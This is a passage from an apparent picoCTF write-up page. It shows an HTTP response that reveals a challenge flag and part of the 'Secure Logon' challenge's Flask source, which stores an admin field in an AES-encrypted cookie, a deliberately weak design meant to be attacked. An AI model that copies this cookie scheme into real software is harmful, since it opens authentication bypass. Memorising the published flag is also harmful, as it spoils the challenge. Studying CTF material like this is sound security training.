</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-24>24</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span> <span style=color:#ae81ff>200</span> <span style=color:#a6e22e>OK</span>
</span></span><span style=display:flex><span>x-powered-by<span style=color:#f92672>:</span> <span style=color:#ae81ff>Express</span>
</span></span><span style=display:flex><span>content-type<span style=color:#f92672>:</span> <span style=color:#ae81ff>text/html; charset=utf-8</span>
</span></span><span style=display:flex><span>content-length<span style=color:#f92672>:</span> <span style=color:#ae81ff>438</span>
</span></span><span style=display:flex><span>etag<span style=color:#f92672>:</span> <span style=color:#ae81ff>W/&#34;1b6-eYJ8DUTdkgByyfWFi6OJJSjopFg&#34;</span>
</span></span><span style=display:flex><span>date<span style=color:#f92672>:</span> <span style=color:#ae81ff>Tue, 09 Oct 2018 15:12:57 GMT</span>
</span></span><span style=display:flex><span>connection<span style=color:#f92672>:</span> <span style=color:#ae81ff>close</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>html</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>head</span>&gt;
</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>link</span> <span style=color:#a6e22e>rel</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text/css&#34;</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;main.css&#34;</span> /&gt;
</span></span><span style=display:flex><span>    &lt;/<span style=color:#f92672>head</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>body</span>&gt;
</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>header</span>&gt;
</span></span><span style=display:flex><span>            &lt;<span style=color:#f92672>h1</span>&gt;Real Business Internal Flag Server&lt;/<span style=color:#f92672>h1</span>&gt;
</span></span><span style=display:flex><span>            &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;user&#34;</span>&gt;Real Business Employee&lt;/<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span>            &lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/logout&#34;</span>&gt;Logout&lt;/<span style=color:#f92672>a</span>&gt;
</span></span><span style=display:flex><span>        &lt;/<span style=color:#f92672>header</span>&gt;
</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>main</span>&gt;
</span></span><span style=display:flex><span>            &lt;<span style=color:#f92672>p</span>&gt;Hello &lt;<span style=color:#f92672>b</span>&gt;Real Business Employee&lt;/<span style=color:#f92672>b</span>&gt;!  Today&#39;s flag is: &lt;<span style=color:#f92672>code</span>&gt;picoCTF{0nLY_Us3_n0N_GmO_xF3r_pR0tOcol5_2e14}&lt;/<span style=color:#f92672>code</span>&gt;.&lt;/<span style=color:#f92672>p</span>&gt;
</span></span><span style=display:flex><span>        &lt;/<span style=color:#f92672>main</span>&gt;
</span></span><span style=display:flex><span>    &lt;/<span style=color:#f92672>body</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>html</span>&gt;
</span></span></code></pre></td></tr></table></div></div><h2 id=xsecure-logon>【X】Secure Logon<a hidden class=anchor aria-hidden=true href=#xsecure-logon>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-45>45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-46>46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-47>47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-48><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-48>48</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-49><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-49>49</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-50><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-50>50</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-51><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-51>51</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-52><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-52>52</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-53><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-53>53</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-54><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-54>54</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-55><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-55>55</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-56><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-56>56</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-57><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-57>57</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-58><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-58>58</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-59><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-59>59</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-60><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-60>60</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-61><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-61>61</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-62><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-62>62</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-63><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-63>63</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-64><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-64>64</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-65><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-65>65</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-66><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-66>66</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-67><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-67>67</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-68><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-68>68</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-69><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-69>69</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-70><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-70>70</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-71><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-71>71</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-72><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-72>72</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-73><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-73>73</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-74><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-74>74</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-75><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-75>75</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-76><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-76>76</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-77><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-77>77</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-78><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-78>78</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-79><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-79>79</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-80><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-80>80</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-81><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-81>81</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-82><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-82>82</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-83><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-83>83</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-84><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-84>84</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-85><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-85>85</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-86><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-86>86</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-87><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-87>87</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-88><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-88>88</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-89><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-89>89</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-90><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-90>90</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-91><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-91>91</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-92><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-92>92</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask, render_template, request, url_for, redirect, make_response, flash
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> json
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> hashlib <span style=color:#f92672>import</span> md5
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> base64 <span style=color:#f92672>import</span> b64decode
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> base64 <span style=color:#f92672>import</span> b64encode
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto <span style=color:#f92672>import</span> Random
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Cipher <span style=color:#f92672>import</span> AES
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__)
</span></span><span style=display:flex><span>app<span style=color:#f92672>.</span>secret_key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;seed removed&#39;</span>
</span></span><span style=display:flex><span>flag_value <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;flag removed&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>BLOCK_SIZE <span style=color:#f92672>=</span> <span style=color:#ae81ff>16</span>  <span style=color:#75715e># Bytes</span>
</span></span><span style=display:flex><span>pad <span style=color:#f92672>=</span> <span style=color:#66d9ef>lambda</span> s: s <span style=color:#f92672>+</span> (BLOCK_SIZE <span style=color:#f92672>-</span> len(s) <span style=color:#f92672>%</span> BLOCK_SIZE) <span style=color:#f92672>*</span> \
</span></span><span style=display:flex><span>                chr(BLOCK_SIZE <span style=color:#f92672>-</span> len(s) <span style=color:#f92672>%</span> BLOCK_SIZE)
</span></span><span style=display:flex><span>unpad <span style=color:#f92672>=</span> <span style=color:#66d9ef>lambda</span> s: s[:<span style=color:#f92672>-</span>ord(s[len(s) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>:])]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;index.html&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/login&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>login</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#39;user&#39;</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;admin&#39;</span>:
</span></span><span style=display:flex><span>        message <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;I&#39;m sorry the admin password is super secure. You&#39;re not getting in that way.&#34;</span>
</span></span><span style=display:flex><span>        category <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;danger&#39;</span>
</span></span><span style=display:flex><span>        flash(message, category)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;index.html&#39;</span>)
</span></span><span style=display:flex><span>    resp <span style=color:#f92672>=</span> make_response(redirect(<span style=color:#e6db74>&#34;/flag&#34;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    cookie <span style=color:#f92672>=</span> {}
</span></span><span style=display:flex><span>    cookie[<span style=color:#e6db74>&#39;password&#39;</span>] <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#39;password&#39;</span>]
</span></span><span style=display:flex><span>    cookie[<span style=color:#e6db74>&#39;username&#39;</span>] <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#39;user&#39;</span>]
</span></span><span style=display:flex><span>    cookie[<span style=color:#e6db74>&#39;admin&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    print(cookie)
</span></span><span style=display:flex><span>    cookie_data <span style=color:#f92672>=</span> json<span style=color:#f92672>.</span>dumps(cookie, sort_keys<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
</span></span><span style=display:flex><span>    encrypted <span style=color:#f92672>=</span> AESCipher(app<span style=color:#f92672>.</span>secret_key)<span style=color:#f92672>.</span>encrypt(cookie_data)
</span></span><span style=display:flex><span>    print(encrypted)
</span></span><span style=display:flex><span>    resp<span style=color:#f92672>.</span>set_cookie(<span style=color:#e6db74>&#39;cookie&#39;</span>, encrypted)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> resp
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/logout&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>logout</span>():
</span></span><span style=display:flex><span>    resp <span style=color:#f92672>=</span> make_response(redirect(<span style=color:#e6db74>&#34;/&#34;</span>))
</span></span><span style=display:flex><span>    resp<span style=color:#f92672>.</span>set_cookie(<span style=color:#e6db74>&#39;cookie&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>, expires<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> resp
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/flag&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>flag</span>():
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>      encrypted <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>cookies[<span style=color:#e6db74>&#39;cookie&#39;</span>]
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>KeyError</span>:
</span></span><span style=display:flex><span>      flash(<span style=color:#e6db74>&#34;Error: Please log-in again.&#34;</span>)
